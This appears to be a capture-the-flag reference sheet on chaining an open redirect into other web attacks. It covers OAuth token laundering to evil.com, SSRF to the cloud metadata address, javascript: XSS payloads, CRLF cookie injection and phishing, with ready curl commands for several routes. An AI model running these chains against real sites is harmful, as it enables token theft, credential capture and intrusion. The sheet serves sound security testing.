# Per-route — each laundering route's reachability and payoff

## Route: open-redirect → OAuth `redirect_uri` launder

```text
reachability: an open-redirect on an allowlisted redirect_uri domain
payoff:       the auth code / access_token lands on the canary
falsifier:    the allowlist is strict AND no allowlisted domain has an
              open-redirect
skill:        web-oauth-sso
```

```bash
# the chain — the redirect_uri carries the open-redirect URL
curl -si "$OAUTH/authorize?client_id=X&redirect_uri=https%3A%2F%2Fclient-app.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fevil.com" | grep -i location
```

## Route: open-redirect → SSRF fetch-follow

```text
reachability: a server-side fetcher that follows 3xx Location
payoff:       the fetcher reaches an internal host past an IP-filter
falsifier:    the fetcher doesn't follow redirects, OR re-checks the
              redirect target
skill:        web-ssrf
```

```bash
curl -s "$BASE/fetch?url=https%3A%2F%2Ftarget.com%2Fredirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
```

## Route: open-redirect → XSS scheme-sink

```text
reachability: the param lands a javascript:/data: scheme in a sink
payoff:       script execution in the target's origin
falsifier:    the scheme is rejected/normalized; the sink is a Location:
              header browsers block JS-schemes in
skill:        web-xss
```

```bash
curl -s "$BASE/x?url=javascript%3Aalert(1)" | grep -i 'location\|refresh'
curl -s "$BASE/x?url=data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -i 'location\|refresh'
```

## Route: open-redirect → bot-visit launder

```text
reachability: a bot that visits attacker URLs on the target's domain
payoff:       the bot lands on attacker content — a token-stealer/CSRF
falsifier:    the bot doesn't follow redirects / doesn't run JS / the
              target's URL isn't visitable by the bot
skill:        web-chromedriver (the bot-reproduction)
```

## Route: open-redirect → phishing/domain-launder

```text
reachability: a URL that starts on target.com and lands on evil.com
payoff:       the domain-reputation borrow — the phishing credential capture
falsifier:    — the standalone case IS the answer if the challenge is the
              phishing shape
skill:        this class's own answer
```

## Route: open-redirect → CRLF header-split

```text
reachability: a %0d%0a in the param reaching the Location: header bytes
payoff:       a Set-Cookie / a second-response split — the CRLF twin
falsifier:    %0d%0a is stripped/rejected — no header split
skill:        web-request-smuggling / the header-injection sibling
```

```bash
curl -si "$BASE/login?next=%2f%0d%0aSet-Cookie:%20session%3Dinj" | head -8
# two headers from one param -> the split
```

## Route: open-redirect → the Referer-leak

```text
reachability: the victim's browser sends the Referer to the canary
payoff:       the ORIGINATING URL (carrying a token/code) in the Referer
falsifier:    a Referrer-Policy that strips the query
```

## Route: open-redirect → token-in-fragment

```text
reachability: the OAuth implicit flow's #access_token
payoff:       the token in the fragment the canary's JS reads
falsifier:    the flow is code-only (response_type=code)
```

## Route: open-redirect → the stored-redirect

```text
reachability: a param that persists then fires on a later flow
payoff:       a stored/two-step redirect — harder to detect
falsifier:    the stored value is re-validated at read-time
```

## Route: open-redirect → the back/Referer-derived

```text
reachability: a /back that 302s to the Referer
payoff:       a header-trust gap — the attacker controls the Referer
falsifier:    the Referer is validated/not-read
```

## The route-to-skill matrix

| The route | The flag-closing skill |
|---|---|
| OAuth launder | `web-oauth-sso` |
| SSRF fetch-follow | `web-ssrf` |
| XSS scheme-sink | `web-xss` |
| bot-visit | `web-chromedriver` |
| phishing launder | this class's answer |
| CRLF split | `web-request-smuggling`/header-injection |
| Referer-leak | `web-info-disclosure` |
| token-in-fragment | `web-oauth-sso` |

## The route-record

`route: open-redirect -> <the-trust>: <the-payload>: <the-reachability>: <the-verdict>`
